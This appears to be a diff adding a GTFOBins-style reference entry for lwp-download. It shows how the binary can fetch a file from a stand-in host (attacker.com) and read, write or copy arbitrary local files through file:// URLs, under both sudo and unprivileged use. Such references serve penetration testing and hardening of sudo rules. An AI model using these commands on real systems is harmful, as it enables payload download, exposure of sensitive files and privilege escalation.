@@ -1,0 +1,41 @@
+lwp-download
+============
+
+Download
+--------
+
+[Sudo]
+    lwp-download http://attacker.com/path/to/input-file /path/to/output-file
+    The destination file `/path/to/output-file` can be omitted, in that case the file is saved to `input-file` in the current working directory.
+
+[Unprivileged]
+    lwp-download http://attacker.com/path/to/input-file /path/to/output-file
+    The destination file `/path/to/output-file` can be omitted, in that case the file is saved to `input-file` in the current working directory.
+
+File read
+---------
+
+[Sudo]
+    lwp-download file:///path/to/input-file /dev/stdout
+
+[Unprivileged]
+    lwp-download file:///path/to/input-file /dev/stdout
+
+File write
+----------
+
+[Sudo]
+    echo DATA >/path/to/temp-file
+lwp-download file:///path/to/temp-file /path/to/output-file
+
+[Unprivileged]
+    echo DATA >/path/to/temp-file
+lwp-download file:///path/to/temp-file /path/to/output-file
+
+[Sudo]
+    lwp-download file:///path/to/input-file /path/to/output-file
+    This actually copies a file to a destination.
+
+[Unprivileged]
+    lwp-download file:///path/to/input-file /path/to/output-file
+    This actually copies a file to a destination.
